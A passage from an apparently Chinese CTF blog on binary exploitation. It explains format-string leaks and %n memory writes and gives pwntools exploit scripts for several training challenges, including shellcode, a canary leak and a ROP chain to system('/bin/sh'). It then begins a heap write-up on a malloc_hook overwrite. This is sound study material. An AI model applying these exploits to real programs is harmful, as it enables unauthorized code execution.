class=\"line\">重定位节 &#39;.rel.plt&#39; 位于偏移量 0x314 含有 4 个条目：</span><br><span class=\"line\"> 偏移量     信息    类型              符号值      符号名称</span><br><span class=\"line\">0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0</span><br><span class=\"line\">0804a010  00000207 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4</span><br><span class=\"line\">0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class=\"line\">0804a018  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>由于一些不可见字符的原因，在写地址写入时会被省略</p>\n</blockquote>\n<p>这里用scanf</p>\n<p>建议写脚本运行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;\\x18\\xa0\\x04\\x08.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#39;</span><br><span class=\"line\">output：</span><br><span class=\"line\">&#39;\\x18\\xa0\\x04\\x08.0xffa9156c.0xf7f314a0.0x1.(nil).0x1.0xf7f5b918.0x804a018.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">p32(0x0804a018) + &quot;%7$s&quot;</span><br><span class=\"line\">output：</span><br><span class=\"line\">&#39;\\x18\\xa0\\x04\\x08\\xd0\\xb0\\xe5\\xf7&#39;</span><br></pre></td></tr></table></figure>\n<p>我们也就泄露出了got表地址</p>\n<blockquote>\n<p>我们不能直接在命令行输入 \\ x0c\\xa0\\x04\\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 \\,x,0,c 分别作为一个字符进行读入。</p>\n</blockquote>\n<h3 id=\"2-4-栈数据覆盖\"><a href=\"#2-4-栈数据覆盖\" class=\"headerlink\" title=\"2.4 栈数据覆盖\"></a>2.4 栈数据覆盖</h3><p>%n转换指示符<strong>将当前已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量</strong></p>\n<p>我们需要以下几个步骤</p>\n<ul>\n<li>确定覆盖地址</li>\n<li>确定相对偏移</li>\n<li>进行覆盖</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[overwrite addr]....%[overwrite offset]$n</span><br><span class=\"line\"></span><br><span class=\"line\">eg：</span><br><span class=\"line\">p32(xx)+&quot;%012d%7$n&quot;</span><br><span class=\"line\">向xx地址指向地址中写入16</span><br><span class=\"line\">%012d  </span><br><span class=\"line\">%08x</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-5-任意地址内存覆盖\"><a href=\"#2-5-任意地址内存覆盖\" class=\"headerlink\" title=\"2.5 任意地址内存覆盖\"></a>2.5 任意地址内存覆盖</h3><h4 id=\"覆盖小数字\"><a href=\"#覆盖小数字\" class=\"headerlink\" title=\"覆盖小数字\"></a>覆盖小数字</h4><p>根据上面的原理，其实我们直到想在哪里放地址都是可以的</p>\n<p>主要是找到对应的偏移量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eg:</span><br><span class=\"line\">AA%15$nA+p32(xx)</span><br></pre></td></tr></table></figure>\n<h4 id=\"覆盖大数字\"><a href=\"#覆盖大数字\" class=\"headerlink\" title=\"覆盖大数字\"></a>覆盖大数字</h4><p>首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即<strong>最低有效位存储在低地址</strong>。举个例子，0x12345678 在内存中由低地址到高地址依次为 \\ x78\\x56\\x34\\x12</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x88888888 0x88888888</span><br><span class=\"line\">printf(&quot;%hhn&quot;)  &#x2F;&#x2F;写入单字节\t0x88888888\t0x88888801</span><br><span class=\"line\">printf(&quot;%hn&quot;)\t\t&#x2F;&#x2F;写入双字节\t0x88888888\t0x88880001</span><br><span class=\"line\">printf(&quot;%n&quot;)\t\t&#x2F;&#x2F;写入4字节\t0x88888888\t0x00000001</span><br><span class=\"line\">printf(&quot;%ln&quot;)\t\t&#x2F;&#x2F;写入8字节\t0x00000000 0x00000001</span><br><span class=\"line\">printf(&quot;%lln&quot;)\t&#x2F;&#x2F;写入16字节\t0x00000000 0x00000000 0x00000000 0x00000001</span><br></pre></td></tr></table></figure>\n<p>所以我们可以给对应的地址写入单字节，来获得大数字</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eg:</span><br><span class=\"line\">&#x2F;&#x2F;偏移量为6</span><br><span class=\"line\">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#39;%6$n&#39;+pad2+&#39;%7$n&#39;+pad3+&#39;%8$n&#39;+pad4+&#39;%9$n&#39;</span><br></pre></td></tr></table></figure>\n<p>这是wiki上的脚本,我们来看一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fmt</span><span class=\"params\">(prev, word, index)</span>:</span> <span class=\"comment\">#prev 之前有多少字母 word 还需要多少 index  偏移</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> prev &lt; word:</span><br><span class=\"line\">        result = word - prev</span><br><span class=\"line\">        fmtstr = <span class=\"string\">\"%\"</span> + str(result) + <span class=\"string\">\"c\"</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> prev == word:</span><br><span class=\"line\">        result = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        result = <span class=\"number\">256</span> + word - prev</span><br><span class=\"line\">        fmtstr = <span class=\"string\">\"%\"</span> + str(result) + <span class=\"string\">\"c\"</span></span><br><span class=\"line\">    fmtstr += <span class=\"string\">\"%\"</span> + str(index) + <span class=\"string\">\"$hhn\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> fmtstr</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fmt_str</span><span class=\"params\">(offset, size, addr, target)</span>:</span><span class=\"comment\">#初始偏移量 字节 目标地址 目标值</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> size == <span class=\"number\">4</span>:</span><br><span class=\"line\">            payload += p32(addr + i)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            payload += p64(addr + i)</span><br><span class=\"line\">    prev = len(payload)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">        payload += fmt(prev, (target &gt;&gt; i * <span class=\"number\">8</span>) &amp; <span class=\"number\">0xff</span>, offset + i)</span><br><span class=\"line\">        prev = (target &gt;&gt; i * <span class=\"number\">8</span>) &amp; <span class=\"number\">0xff</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>offset 表示要覆盖的地址最初的偏移</li>\n<li>size 表示机器字长</li>\n<li>addr 表示将要覆盖的地址。</li>\n<li>target 表示我们要覆盖为的目的变量值</li>\n</ul>\n</blockquote>\n<h1 id=\"0x03-格式化字符串例题\"><a href=\"#0x03-格式化字符串例题\" class=\"headerlink\" title=\"0x03 格式化字符串例题\"></a>0x03 格式化字符串例题</h1><h2 id=\"string\"><a href=\"#string\" class=\"headerlink\" title=\"string\"></a>string</h2><p>虽然说只是新手区，但还是记录一下这道题目</p>\n<p>这道题主要是如何调取shell</p>\n<p>在没有system和/bin/sh，就应该想到用shellcode</p>\n<p>那么shellcode应该往哪里写，又从哪里调用呢</p>\n<p>nx开了，栈上也就不可写了，bss段上也没有什么东西</p>\n<p>那我们往哪里写呢</p>\n<p><img src=\"/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20201223212813215.png\" alt=\"image-20201223212813215\"></p>\n<p>看这里，我们可以在这里写入shellcode</p>\n<p>还有这个题还有一个问题就是利用pwntools生成shellcode</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">context(arch=<span class=\"string\">'amd64'</span>, os=<span class=\"string\">'linux'</span>, log_level=<span class=\"string\">'debug'</span>)</span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>\n<p>不同机器汇编代码不同</p>\n<p>贴exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"220.249.52.134\"</span>,<span class=\"number\">31872</span>)<span class=\"comment\">#220.249.52.134:31872</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./string\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">'amd64'</span>, os=<span class=\"string\">'linux'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'secret[0] is '</span>)</span><br><span class=\"line\">v4 = int(p.recvuntil(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"What should your character's name be:\"</span>, <span class=\"string\">'pz1o'</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"So, where you will go?east or up?:\"</span>, <span class=\"string\">'east'</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"go into there(1), or leave(0)?:\"</span>, <span class=\"string\">'1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"'Give me an address'\"</span>, str(int(v4)))</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"And, you wish is:\"</span>, <span class=\"string\">'%85c%7$n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"USE YOU SPELL\"</span>, shellcode)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>格式化字符串：</p>\n<p>%85c%7$n</p>\n<p>把85写入偏移量为7的地方</p>\n</blockquote>\n<h2 id=\"CGfsb\"><a href=\"#CGfsb\" class=\"headerlink\" title=\"CGfsb\"></a>CGfsb</h2><p>格式化字符串漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%d - 十进制 - 输出十进制整数</span><br><span class=\"line\">%s - 字符串 - 从内存中读取字符串</span><br><span class=\"line\">%x - 十六进制 - 输出十六进制数</span><br><span class=\"line\">%c - 字符 - 输出字符</span><br><span class=\"line\">%p - 指针 - 指针地址</span><br><span class=\"line\">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li><code>%n</code>，如<code>printf(&quot;abcdefg%n&quot;);</code>,%n前面写了7个字符，所以向ESP（栈顶指针）所指向的地址处所指向的地址处（ESP指向了栈顶，此处存储着一个地址）写入7。</li>\n<li><code>%10$n</code>，与<code>%n</code>类似，不过是向[ESP + 10]处指向的内存处写入7。</li>\n</ul>\n</blockquote>\n<p>exp</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"220.249.52.134\"</span>,<span class=\"number\">47890</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"please tell me your name:\"</span>)</span><br><span class=\"line\">r.sendline(b<span class=\"number\">'111'</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"leave your message please:\"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a068</span>)+b<span class=\"number\">'</span>aaaa%<span class=\"number\">10</span>$n<span class=\"number\">'</span></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-babyrop2\"><a href=\"#bjdctf-2020-babyrop2\" class=\"headerlink\" title=\"bjdctf_2020_babyrop2\"></a>bjdctf_2020_babyrop2</h2><p>格式化字符串泄露canary</p>\n<blockquote>\n<p>这里规定了输入长度</p>\n<p>我们可以用下面来观察我们AA是在第几个参数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;AA%6$p</span><br></pre></td></tr></table></figure>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.11\")</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.232.so\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28762</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.11\"</span>)</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts_plt = elf.sym[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">vuln = elf.sym[<span class=\"string\">\"vuln\"</span>]</span><br><span class=\"line\">ru(<span class=\"string\">\"I'll give u some gift to help u!\\n\"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">\"%7$p\"</span>)</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000400993</span></span><br><span class=\"line\">ret = <span class=\"number\">0x00000000004005f9</span></span><br><span class=\"line\">canary = ru(<span class=\"string\">'00\\n'</span>)</span><br><span class=\"line\">canary = int(canary+<span class=\"string\">'00'</span>,<span class=\"number\">16</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"canary\"</span>,canary)</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*<span class=\"number\">0x18</span>+p64(canary)+<span class=\"string\">b'A'</span>*<span class=\"number\">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class=\"line\">ru(<span class=\"string\">\"Pull up your sword and tell me u story!\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">puts = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.dump(<span class=\"string\">\"puts\"</span>)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">sh = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*<span class=\"number\">0x18</span>+p64(canary)+<span class=\"string\">b'A'</span>*<span class=\"number\">0x8</span>+p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class=\"line\">ru(<span class=\"string\">\"Pull up your sword and tell me u story!\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"BUU(PWN2)---堆","url":"https://pz1o.top/2021/02/15/BUU-PWN3-堆/","content":"<h2 id=\"babyheap-0ctf-2017（malloc-hook-onegadget）\"><a href=\"#babyheap-0ctf-2017（malloc-hook-onegadget）\" class=\"headerlink\" title=\"babyheap_0ctf_2017（malloc_hook+onegadget）\"></a>babyheap_0ctf_2017（malloc_hook+onegadget）</h2><p>四个功能的堆</p>\n<ul>\n<li>Allocate：分配内存大小并给出 index</li>\n<li>Fill：输入 index ，并分配内存进行内容写入操作</li>\n<li>Free：输入 index ，释放相应的内存空间</li>\n<li>Dump：输入 index ，打印内容</li>\n</ul>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223160414468.png\" alt=\"image-20210223160414468\"></p>\n<p>add</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230306738.png\" alt=\"image-20210223230306738\"></p>\n<blockquote>\n<p>C 库函数 <strong>void *calloc(size_t nitems, size_t size)</strong> 分配所需的内存空间，并返回一个指向它的指针。<strong>malloc</strong> 和 <strong>calloc</strong> 之间的不同点是，malloc 不会设置内存为零，而 calloc 会设置分配的内存为零。</p>\n</blockquote>\n<p>fill</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230325725.png\" alt=\"image-20210223230325725\"></p>\n<blockquote>\n<p>这里size没做限制，可以堆溢出</p>\n</blockquote>\n<p>free</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230340158.png\" alt=\"image-20210223230340158\"></p>\n<p>print</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230355914.png\" alt=\"image-20210223230355914\"></p>\n<h3 id=\"漏洞点：\"><a href=\"#漏洞点：\" class=\"headerlink\" title=\"漏洞点：\"></a>漏洞点：</h3><ol>\n<li>有无限制字节的堆溢出</li>\n</ol>\n<h3 id=\"思路：\"><a href=\"#思路：\" class=\"headerlink\" title=\"思路：\"></a>思路：</h3><p>这个题主要有两大部分，第一部分是泄露libc基址，第二部分写入one_gadget</p>\n<ol>\n<li>首先要想泄露libc基址，就需要用到一个技巧，主要是unsorted bin 中只有一个块时，它的fd和bk指向同一个地方，并且这个指针相对偏移是固定的，下面有详细操作。因此，我们就需要弄出一个unsorted bin chunk来，并且能够打印其中的内容，也就是经典的伪造chunk，使一个块就可以被打印，同时其中还有fd和bk指针。</li>\n<li>具体该怎么做？首先分配4块fastchunk，1块smallchunk，将中间两块fastchunk释放后，将其fd指针指向smallchunk，这样再分配两块fastchunk，就可以从smallchunk中打印了。接下来把smallchunk进行free即可得到unsorted bin中的fd和bk指针。这样也就得到了libc偏移</li>\n<li>第二部分写入one_gadget,具体就是向malloc_hook写入one_gadget,但这里需要注意偏移问题，因为我们伪造chunksize是7f,所以我们可以找7f的地方。和第一部分一样，主要是改变fastchunk的fd指针指向我们找好的伪造chunk，之后进行再次分配。就可以任意写。</li>\n</ol>\n<h3 id=\"技巧：\"><a href=\"#技巧：\" class=\"headerlink\" title=\"技巧：\"></a>技巧：</h3><ol>\n<li>获取libc基址通过unsorted bin来获取</li>\n<li>改写malloc_hook，直接one_gadget拿到shell</li>\n</ol>\n<blockquote>\n<p>此题有两个技巧：</p>\n<p>1.通过unsorted bin中fd和bk同时指向main_arena内的信息，来获得libc基址具体，怎么查看减多少，可以看下面</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224003723169.png\" alt=\"image-20210224003723169\"></p>\n<p>可以看到fd和bk指向同一个地方，此时查看进程</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224004547238.png\" alt=\"image-20210224004547238\"></p>\n<p>找到其中的空间布局（当然可以直接pwndbg中vmmap）</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224004734621.png\" alt=\"image-20210224004734621\"></p>\n<p>看libc实际加载地址和fd指针的偏移，这个偏移是固定的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;0x7efcea106b78-0x7efce9d42000&#x3D;0x3c4b78</span><br></pre></td></tr></table></figure>\n<p>这样就算出偏移了</p>\n<p>2.<strong>malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写</strong> malloc_hook 来 getshell。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;void *(*hook) (size_t, const void *)</span><br><span class=\"line\">  &#x3D; atomic_forced_read (__malloc_hook);</span><br><span class=\"line\">if (__builtin_expect (hook !&#x3D; NULL, 0))</span><br><span class=\"line\">  return (*hook)(bytes, RETURN_ADDRESS (0));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;pwndbg&gt; x&#x2F;32gx (long long)(&amp;main_arena)-0x40</span><br><span class=\"line\">&gt;0x7f92af6c2ae0 &lt;_IO_wide_data_0+288&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2af0 &lt;_IO_wide_data_0+304&gt;:\t0x00007f92af6c1260\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b00 &lt;__memalign_hook&gt;:\t0x00007f92af383ea0\t0x00007f92af383a70</span><br><span class=\"line\">&gt;0x7f92af6c2b10 &lt;__malloc_hook&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b20 &lt;main_arena&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b50 &lt;main_arena+48&gt;:\t0x00005594c5a61080\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00005594c5a611a0</span><br><span class=\"line\">&gt;0x7f92af6c2b80 &lt;main_arena+96&gt;:\t0x00005594c5a610f0\t0x00005594c5a610f0</span><br><span class=\"line\">&gt;0x7f92af6c2b90 &lt;main_arena+112&gt;:\t0x00005594c5a610f0\t0x00007f92af6c2b88</span><br><span class=\"line\">&gt;0x7f92af6c2ba0 &lt;main_arena+128&gt;:\t0x00007f92af6c2b88\t0x00007f92af6c2b98</span><br><span class=\"line\">&gt;0x7f92af6c2bb0 &lt;main_arena+144&gt;:\t0x00007f92af6c2b98\t0x00007f92af6c2ba8</span><br><span class=\"line\">&gt;0x7f92af6c2bc0 &lt;main_arena+160&gt;:\t0x00007f92af6c2ba8\t0x00007f92af6c2bb8</span><br><span class=\"line\">&gt;0x7f92af6c2bd0 